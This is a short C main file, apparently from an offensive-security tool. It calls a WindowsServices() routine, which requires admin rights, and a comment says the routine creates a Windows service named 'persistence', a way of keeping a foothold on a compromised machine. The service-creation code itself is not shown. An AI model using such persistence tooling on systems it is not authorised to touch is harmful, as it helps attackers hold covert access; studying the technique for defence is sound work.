#include "box.h"

/**
* You can change the same of the newly created services
* I just made it "persistence" so I can identify it easily :)
*/

int main()
{

	if (!WindowsServices()) // REQUIRES ADMIN PERMISSIONS
	{
		PRINT_ERROR("WindowsServices");
		return 1;
	}

	OKAY("DONE!");

	return 0;

}